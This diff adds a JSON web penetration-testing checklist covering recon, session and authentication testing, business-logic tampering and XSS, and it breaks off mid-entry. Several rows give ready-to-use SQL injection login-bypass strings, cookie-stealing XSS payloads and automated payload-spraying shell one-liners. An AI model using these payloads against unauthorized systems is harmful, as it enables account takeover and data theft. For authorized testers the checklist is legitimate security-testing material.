@@ -1,0 +1,1458 @@
+{
+  "title": "Web Penetration Testing Checklist",
+  "columns": ["sr_no", "category", "activity", "tools_technique", "remarks"],
+  "checklist": [
+    {
+      "sr_no": 1,
+      "category": "Fingerprinting Application",
+      "activity": "Bruteforce sub domains",
+      "tools_technique": [
+        "Dnsdumster.com",
+        "builtwith.com",
+        "Sublist3r - python3 sublist3r.py -d chintan.com -p80,443,8080,8001,8009,280,591,583,832,981,1311,2480,4444,4445,4567,5000,5104,5800,7000,7001,7002,8008,8042,8088,8222,8243,8280,8281,8333,8530,8531,8887,8888,8443,8834,9080,9443,9981,12043,12046,16080,18091,10443,18092,81,300,593,1010,1311,2082,2087,2095,2096,3000,3128,3333,4243,4711,4712,4993,5108,6543,7396,7474,8000,8001,8008,8014,8069,8080,8081,8090,8091,8118,8123,8172,8443,8500,8880,8888,8983,9000,9043,9060,9090,9091,9200,9800,12443,20720,28017",
+        "crt.sh - curl -s \"https://crt.sh/?q=%25.att.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | httpx -title -silent | anew",
+        "Altdns",
+        "Assetfinder",
+        "Amass enum -d target.com",
+        "assetfinder -subs-only http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep \"tesla\""
+      ],
+      "remarks": "Check for the third level domains"
+    },
+    {
+      "sr_no": 2,
+      "category": "Fingerprinting Application",
+      "activity": "Directory enumeration",
+      "tools_technique": [
+        "Dirb",
+        "Gobuster",
+        "BurpSuite",
+        "ZAP Proxy",
+        "Dirbuster or Dirb with latest wordlist",
+        "Site:.domain.com"
+      ],
+      "remarks": "Find admin panel based on CMS or bruteforcing"
+    },
+    {
+      "sr_no": 3,
+      "category": "Fingerprinting Application",
+      "activity": "Identify the underlying web client and server technology",
+      "tools_technique": [
+        "Wappalyzer add-on",
+        "Response header"
+      ],
+      "remarks": ""
+    },
+    {
+      "sr_no": 4,
+      "category": "Fingerprinting Application",
+      "activity": "Uncover HTTP services running on ports other than 80 and 443",
+      "tools_technique": ["Nmap"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 5,
+      "category": "Fingerprinting Application",
+      "activity": "Leaked info",
+      "tools_technique": [
+        "Breach Compilation",
+        "We Leak Info",
+        "https://hunter.io/",
+        "https://dorks.faisalahmed.me for Google dorking"
+      ],
+      "remarks": ""
+    },
+    {
+      "sr_no": 6,
+      "category": "Fingerprinting Application",
+      "activity": "Find sensitive information through keywords after crawling entire website. Keywords such as: Password, admin, http, todo",
+      "tools_technique": ["BurpSuite Engagement Tools"],
+      "remarks": "a. Search for http:// to find insecure endpoints. b. Search for keywords like admin, todo etc. c. Search for both http:// & https:// to find hidden endpoints in js files"
+    },
+    {
+      "sr_no": 7,
+      "category": "Network Testing",
+      "activity": "Test for ping",
+      "tools_technique": ["Ping CMD"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 8,
+      "category": "Network Testing",
+      "activity": "Use Censys",
+      "tools_technique": ["Censys"],
+      "remarks": "Give domain name and find exposed devices, services, mail exchange servers and much more"
+    },
+    {
+      "sr_no": 9,
+      "category": "Network Testing",
+      "activity": "DNS testing - Zone transfer, Missing Certification Authority Authorization (CAA) Record, Missing DNSSEC",
+      "tools_technique": ["Manual"],
+      "remarks": "Perform local WHOIS search instead of global WHOIS domain to find more information"
+    },
+    {
+      "sr_no": 10,
+      "category": "Network Testing",
+      "activity": "Nessus scan",
+      "tools_technique": ["Nessus"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 11,
+      "category": "Network Testing",
+      "activity": "Banner disclosure of services other than 80 and 443",
+      "tools_technique": ["Nmap"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 12,
+      "category": "Application Component Audit",
+      "activity": "Find all web servers using Nmap",
+      "tools_technique": ["nmap -sS -n -Pn -p -sV 80,443,8080,8001,8009,280,591,583,832,981,1311,2480,4444,4445,4567,5000,5104,5800,7000,7001,7002,8008,8042,8088,8222,8243,8280,8281,8333,8530,8531,8887,8888,8443,8834,9080,9443,9981,12043,12046,16080,18091,10443,18092,81,300,593,1010,1311,2082,2087,2095,2096,3000,3128,3333,4243,4711,4712,4993,5108,6543,7396,7474,8000,8001,8008,8014,8069,8080,8081,8090,8091,8118,8123,8172,8443,8500,8880,8888,8983,9000,9043,9060,9090,9091,9200,9800,12443,20720,28017 -iL target.txt -oA web_result -vvv --open"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 13,
+      "category": "Application Component Audit",
+      "activity": "UDP proto scanner",
+      "tools_technique": ["perl udp-proto-scanner.pl --file target.txt"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 14,
+      "category": "Application Component Audit",
+      "activity": "Application Mapping - Generate site structure",
+      "tools_technique": ["Manual", "Freemind tool"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 15,
+      "category": "Application Component Audit",
+      "activity": "Identify known vulnerabilities in the web/app server",
+      "tools_technique": [
+        "Nessus scanning",
+        "Nexpose scanning",
+        "Exploit Suggestor"
+      ],
+      "remarks": ""
+    },
+    {
+      "sr_no": 16,
+      "category": "Application Component Audit",
+      "activity": "SSL/TLS certificate testing",
+      "tools_technique": ["Qualys SSL/TLS Scan"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 17,
+      "category": "Audit Session Management",
+      "activity": "Identify actual session cookie out of bulk cookies in the application",
+      "tools_technique": ["Burpsuite Repeater"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 18,
+      "category": "Audit Session Management",
+      "activity": "Decode cookies using some standard decoding algorithms such as Base64, hex, URL etc.",
+      "tools_technique": ["BurpSuite decoder", "Online websites"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 19,
+      "category": "Audit Session Management",
+      "activity": "Modify cookie/session token value by 1 bit/byte. Then resubmit and do the same for all tokens. Identify which part of token is actually being used and which is not.",
+      "tools_technique": ["BurpSuite Repeater"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 20,
+      "category": "Audit Session Management",
+      "activity": "If self-registration is available and you can choose your username, log in with a series of similar usernames containing small variations (e.g. A, AA, AAA, AAAA, AAAB, AAAC, AABA) and check user-specific data submitted at login or stored in user profiles",
+      "tools_technique": ["BurpSuite Repeater"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 21,
+      "category": "Audit Session Management",
+      "activity": "Token leakage via Referer header - Untrusted 3rd Party",
+      "tools_technique": ["BurpSuite Repeater"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 22,
+      "category": "Audit Session Management",
+      "activity": "Check for session cookies and cookie expiration date/time",
+      "tools_technique": ["Burpsuite Session timeout test extender"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 23,
+      "category": "Audit Session Management",
+      "activity": "Identify cookie domain scope",
+      "tools_technique": ["Burpsuite Proxy"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 24,
+      "category": "Audit Session Management",
+      "activity": "Check for HttpOnly flag in cookie",
+      "tools_technique": ["Firebug add-on (Firefox)"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 25,
+      "category": "Audit Session Management",
+      "activity": "Check for Secure flag in cookie if the application is over SSL",
+      "tools_technique": ["Firebug add-on (Firefox)"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 26,
+      "category": "Audit Session Management",
+      "activity": "Check for session fixation i.e. value of session cookie before and after authentication",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 27,
+      "category": "Audit Session Management",
+      "activity": "Password reset link token does not expire (Insecure Configurability)",
+      "tools_technique": ["Manual"],
+      "remarks": "1. Create your account on target. 2. Request a forget password link. 3. Don't use that link. 4. Instead log in with your old password and change your email to another. 5. Now use that password link sent to old email and check if you are able to change your password."
+    },
+    {
+      "sr_no": 28,
+      "category": "Audit Session Management",
+      "activity": "Replay the session cookie from a different effective IP address or system to check whether server maintains the state of the machine or not",
+      "tools_technique": ["Burpsuite", "Different ISP location"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 29,
+      "category": "Audit Session Management",
+      "activity": "Old session does not expire",
+      "tools_technique": ["Manual"],
+      "remarks": "1. Create your account. 2. Open two browsers (e.g. Chrome and Firefox). 3. Login in one browser. 4. In other browser login then change or reset your password. 5. After successfully changed/reset go to other browser and refresh the page — if still logged in, it is vulnerable."
+    },
+    {
+      "sr_no": 30,
+      "category": "Audit Session Management",
+      "activity": "Check for concurrent login through different machine/IP",
+      "tools_technique": ["Firefox", "Chrome", "Internet Explorer"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 31,
+      "category": "Audit Session Management",
+      "activity": "Check if any user pertaining information is stored in cookie value or not. If yes, tamper it with other user's data.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 32,
+      "category": "Audit Registration",
+      "activity": "Check for duplicate registration / Overwrite existing user",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 33,
+      "category": "Audit Registration",
+      "activity": "Check for weak password policy",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 34,
+      "category": "Audit Registration",
+      "activity": "Check for stored values in username, account name for registration",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 35,
+      "category": "Audit Registration",
+      "activity": "Check for insufficient email verification process",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 36,
+      "category": "Audit Registration",
+      "activity": "Weak registration implementation - Allows disposable email addresses",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 37,
+      "category": "Audit Registration",
+      "activity": "Overwrite default web application pages by specially crafted username registrations. If profile link appears as www.chintan.com/username, enumerate default folders (/images, /contact, /portfolio) and register using those as usernames. Check if default folders have been overwritten.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 38,
+      "category": "Audit Registration",
+      "activity": "Username enumeration",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 39,
+      "category": "Audit Authentication",
+      "activity": "Bypass authentication using various SQL Injections on username and password field. Use combinations: chintan' --, chintan' #, chintan'/*, ' or 1=1 --, ' or 1=1 #, ' or 1=1/*, ') or '1'='1 --, ') or ('1'='1 --",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 40,
+      "category": "Audit Authentication",
+      "activity": "Auto-complete testing",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 41,
+      "category": "Audit Authentication",
+      "activity": "Lack of password confirmation on: Change email address, Change password, Manage 2FA. CHECK 2FA Cheatsheet from the Resource Section.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 42,
+      "category": "Audit Authentication",
+      "activity": "Is it possible to use resources without authentication? Access violation.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 43,
+      "category": "Audit Authentication",
+      "activity": "Check if user credentials are transmitted over SSL or not",
+      "tools_technique": ["SSL/TLS lock"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 44,
+      "category": "Audit Authentication",
+      "activity": "Weak login function - HTTP and HTTPS both are available",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 45,
+      "category": "Audit Authentication",
+      "activity": "Test user account lockout mechanism on bruteforce attack. Variation: If server blocks instant user requests, try with time throttle option from intruder. A. Bypass rate limiting by tampering user agent to Mobile User agent. B. Bypass rate limiting by tampering user agent to Anonymous user agent.",
+      "tools_technique": ["Burpsuite intruder with time throttle option"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 46,
+      "category": "Audit Authentication",
+      "activity": "Create a password wordlist using cewl command: cewl -m 12,20 -w ~/Desktop/chintan.txt chintan.com. Use the wordlist with the Transmute python file to create complex wordlist for the bruteforce process.",
+      "tools_technique": [
+        "CewL",
+        "Transmute - https://github.com/eshork/transmute"
+      ],
+      "remarks": "Reference: https://www.hackingarticles.in/comprehensive-guide-on-cewl-tool/"
+    },
+    {
+      "sr_no": 47,
+      "category": "Audit Authentication",
+      "activity": "OTP Bypass response manipulation (Register or login or password reset). Steps: 1. Register 2 accounts. 2. Intercept request. 3. Intercept response to this request. 4. Check message status (e.g. status:1). 5. With other account enter wrong OTP. 6. Intercept response. 7. See status:0. 8. Change status to 1 and forward the request.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 48,
+      "category": "Audit Authentication",
+      "activity": "403 Bypass techniques: X-Original-URL header injection, URL encoding (%2e), path variations (/admin/monitor/;panel), X-Custom-IP-Authorization: 127.0.0.1, Host header to google.com, path variations (example.com/admin/., //admin//, /./admin/./), subdomain redirect bypass",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": "GET /admin HTTP/1.1 -> 403 Forbidden. GET /anything HTTP/1.1 with X-Original-URL: /admin -> 200 OK. https://web.com/%2e/path -> 200 OK. /admin/monitor/;panel -> 200 OK. X-Custom-IP-Authorization: 127.0.0.1 -> 302 Found/200 OK"
+    },
+    {
+      "sr_no": 49,
+      "category": "Audit Authentication",
+      "activity": "Test OAuth login functionality for Open Redirection. 1. Use Burp 'find' option to find parameters such as url, red, redirect, redir, origin, dest, targetURL, checkout_URL. 2. Check the value of these parameters which may contain a URL. 3. Check open redirection for OAuth functionality. 4. Change the URL value to www.chintan.com and check if it gets redirected. 5. Check if same secret code request can be used multiple times.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 50,
+      "category": "Error Codes Testing",
+      "activity": "Generate custom pages such as /chintan.php, chintan.aspx and identify error page",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 51,
+      "category": "Error Codes Testing",
+      "activity": "Add multiple parameters in same POST/GET request using different values and generate error",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 52,
+      "category": "Error Codes Testing",
+      "activity": "Add [], ]], and [[ in cookie values and parameter values to create errors",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 53,
+      "category": "Error Codes Testing",
+      "activity": "Try to generate unusual error code by giving input as /~chintan/%s at the end of website URL",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 54,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Find parameter which uses active account user id. Try to tamper it in order to change the details of other account.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 55,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Create a list of features that are pertaining to a user account only (Change Email, Change Password, Change account details - Name, Number, Address, etc.) and Try CSRF",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 56,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Post login change email id and update with any existing email id. Check if it is getting validated on server side or not. Does the application send any new email confirmation link to a new user? What if a user does not confirm the link in some time frame?",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 57,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Perform all file upload tests using extension tampering and file content modifying. Unsafe File upload: No Antivirus, No Size Limit, File extension Filter Bypass. Bypass file upload restrictions: Add ' , . \" after the file extension (e.g. file.php', file.php., file.php\")",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 58,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Open profile picture in new tab and check the URL. Find email id/user id info. EXIF Geolocation Data Not Stripped From Uploaded Images.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 59,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Check account deletion option if application provides it and confirm that via forgot password feature",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 60,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Change email id, account id, user id parameter and try to bruteforce other user's password",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 61,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Check whether application re-authenticates for performing sensitive operation for post authentication features",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 62,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Privilege escalation. Steps: Sign in as attacker, go to active sessions settings tab and revoke all sessions besides current. Sign in as admin in other browser. Go to users admin section and impersonate attacker. Update active sessions tab as attacker. Inspect Revoke button and copy session ID. Clear attacker browser cookie. Set _gitlab_session to the copied session ID via developer console. Refresh page to be inside impersonated session. Click Stop impersonating to become admin.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 63,
+      "category": "Post Login Account Information Testing / Testing My Account Information",
+      "activity": "Failure to invalidate session on Logout and Password reset",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 64,
+      "category": "Forgot Password Testing",
+      "activity": "Check if forget password reset link/code uniqueness",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 65,
+      "category": "Forgot Password Testing",
+      "activity": "Check if reset link does get expire or not if it is not used by the user for certain amount of time",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 66,
+      "category": "Forgot Password Testing",
+      "activity": "Find user account identification parameter and tamper Id or parameter value to change other user's password",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 67,
+      "category": "Forgot Password Testing",
+      "activity": "Check for weak password policy",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 68,
+      "category": "Forgot Password Testing",
+      "activity": "Weak password reset implementation - Token is not invalidated after use",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 69,
+      "category": "Forgot Password Testing",
+      "activity": "If reset link has another params such as date and time, change date and time value in order to make an active and valid reset link.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": "Old link becomes valid if date and time parameter values are changed to fresh ones. Date/time link is not user dependent and therefore valid across all users."
+    },
+    {
+      "sr_no": 70,
+      "category": "Forgot Password Testing",
+      "activity": "Check if security questions are asked. How many guesses allowed? Lockout policy maintained or not?",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 71,
+      "category": "Forgot Password Testing",
+      "activity": "Add only spaces in new password and confirmed password. Then hit enter and see the result.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 72,
+      "category": "Forgot Password Testing",
+      "activity": "Does it display old password on the same page after completion of forget password formality?",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 73,
+      "category": "Separators",
+      "activity": "No domain email - email=victim",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 74,
+      "category": "Separators",
+      "activity": "No TLD email - email=victim@xyz",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 75,
+      "category": "Separators",
+      "activity": "JSON table - {\"email\":[\"victim@chintan.com\",\"hacker@chintan.com\"]}",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 76,
+      "category": "Separators",
+      "activity": "email=victim@chintan.com, hacker@chintan.com",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 77,
+      "category": "Separators",
+      "activity": "email=victim@chintan.com%20hacker@chintan.com",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 78,
+      "category": "Separators",
+      "activity": "email=victim@chintan.com|hacker@chintan.com",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 79,
+      "category": "Separators",
+      "activity": "Carbon Copy - email=victim@chintan.com%0a%0dcc:hacker@chintan.com",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 80,
+      "category": "Separators",
+      "activity": "Double Parameter - email=victim@chintan.com&email=hacker@chintan.com",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 81,
+      "category": "Forgot Password Testing",
+      "activity": "Ask for two password reset links and use the older one from user's email",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 82,
+      "category": "Forgot Password Testing",
+      "activity": "Check if active session gets destroyed upon changing the password or not",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": "Proof of Concept: Changing the password in some applications doesn't destroy other sessions. As other sessions are not destroyed, attacker will still be logged in even after password change. PATCH: When someone changes their password, every active session belonging to that particular account must be destroyed."
+    },
+    {
+      "sr_no": 83,
+      "category": "Forgot Password Testing",
+      "activity": "Weak password reset implementation - Password reset token sent over HTTP",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 84,
+      "category": "Forgot Password Testing",
+      "activity": "Send continuous forget password requests so that it may send sequential tokens",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 85,
+      "category": "Contact Us / Feedback Form Testing",
+      "activity": "Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks?",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 86,
+      "category": "Contact Us / Feedback Form Testing",
+      "activity": "Does it allow to upload file on the server?",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 87,
+      "category": "Product Purchase Testing",
+      "activity": "A. Buy Now: Tamper product ID to purchase other high valued product with low price. Tamper product data in order to increase the number of product with the same price.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 88,
+      "category": "Product Purchase Testing",
+      "activity": "B. Gift / Voucher: Tamper gift/voucher count in the request. Tamper gift/voucher value to increase/decrease the money value. Reuse gift/voucher by using old gift values. Check the uniqueness of gift/voucher parameter and try guessing other gift/voucher codes. Use parameter pollution technique to add same voucher twice.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 89,
+      "category": "Product Purchase Testing",
+      "activity": "C. Add/Delete Product from Cart: Tamper user id to delete products from other user's cart. Tamper cart id to add/delete products from other user's cart. Identify cart id/user id for cart feature to view added items from other user's account.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 90,
+      "category": "Product Purchase Testing",
+      "activity": "D. Address: Tamper BurpSuite request to change other user's shipping address to yours. Try stored-XSS by adding XSS vector on shipping address. Use parameter pollution technique to add two shipping addresses instead of one.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 91,
+      "category": "Product Purchase Testing",
+      "activity": "E. Place Order: Tamper payment options parameter to change the payment method. Tamper the amount value for payment manipulation. Check if CVV is going in cleartext. Check if credit/debit card details are masked. Check if application itself processes card details or calls third party payment processing company.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 92,
+      "category": "Product Purchase Testing",
+      "activity": "F. Track Order: Track other user's order by guessing order tracking number",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 93,
+      "category": "Flight / Railway / Hotel / Cab etc. Booking Testing",
+      "activity": "A. Booking details: View/Manage other user's booking details. Check reservation status for other users/behalf of other users.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 94,
+      "category": "Flight / Railway / Hotel / Cab etc. Booking Testing",
+      "activity": "B. Ticket/Vouchers: View other users vouchers/e-tickets from PRINT option. Check if sensitive data is passed in GET request. If e-ticket/voucher is sent on email, check for the email flooding attack.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 95,
+      "category": "Flight / Railway / Hotel / Cab etc. Booking Testing",
+      "activity": "C. Refund: View other user's refund status. Refund more money than the intended one by parameter manipulation. If refund tracking is allowed, gain other user's refund tracking status.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 96,
+      "category": "Flight / Railway / Hotel / Cab etc. Booking Testing",
+      "activity": "D. Cancellation: Gain higher cancellation amount with parameter modifying for amount value.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 97,
+      "category": "Flight / Railway / Hotel / Cab etc. Booking Testing",
+      "activity": "E. Booking: Do 1st person booking and add 3 other persons in same price. Hotel - Book normal room - Select Deluxe room in the same price.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 98,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Locator payload: '';!--\"<chintan>=&{()}",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 99,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Try XSS using XSSstrike tool by Somdev Sangwan: python3.8 xsstrike.py --seeds domains.txt --crawl -l 3 --skip --skip-dom",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 100,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Upload file using '\"><img src=x onerror=alert(document.domain)>.txt",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 101,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Standard payload for URI and all inputs: \"><img src=x onerror=prompt(document.cookie);><!--  \"><img src=x onerror=confirm(document.cookie);><!--  \"><img src=x onerror=alert(document.cookie);><!--",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 102,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "If script tags are banned, use <h1> and other HTML tags",
+      "tools_technique": ["www.w3schools.com"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 103,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "If output is reflected back inside the javascript as a value of any variable just use alert(1)",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 104,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "If \" are filtered then use this payload: /><img src=d onerror=confirm(/chintan/);>",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 105,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Upload a javascript using Image file",
+      "tools_technique": ["gifsicle - Tool to bind javascript within GIF"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 106,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Unusual way to execute your JS payload is to change method from POST to GET. It bypasses filters sometimes.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 107,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "findomain -t bugskan.com -q | httpx -silent | anew | waybackurls | gf xss >> xssss ; grep \"=\" | egrep -iv \".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)\" | qsreplace '\"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure \"$host\" | grep -qs \"<script>confirm(1)</script>\" && echo \"$host \\033[0;31mVulnerable\\n\"; done",
+      "tools_technique": ["Terminal"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 108,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "cat urls.txt | gf xss | qsreplace '\"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure \"$host\" | grep -qs \"<script>confirm(1)</script>\" && echo \"$host \\033[0;31mVulnerable\\n\"; done",
+      "tools_technique": ["Terminal"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 109,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "gospider -S domain.txt -t 3 -c 100 | tr \" \" \"\\n\" | grep -v \".js\" | grep \"https://\" | grep \"=\" | qsreplace '%22><svg%20onload=confirm(1);>'",
+      "tools_technique": ["Terminal"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 110,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Tag attribute value. Input landed: <input type=\"text\" name=\"state\" value=\"INPUT_FROM_USER\">. Payload to be inserted: \" onfocus=\"alert(document.cookie)",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 111,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Syntax Encoding payload: %3cscript%3ealert(document.cookie)%3c/script%3e",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 112,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "ASP.NET IE9 Filter evasion for htmlentities: &lt;%tag style=\"chintan:expression(alert('chintan'))\"&gt;",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 113,
+      "category": "Cross Site Scripting (XSS)",
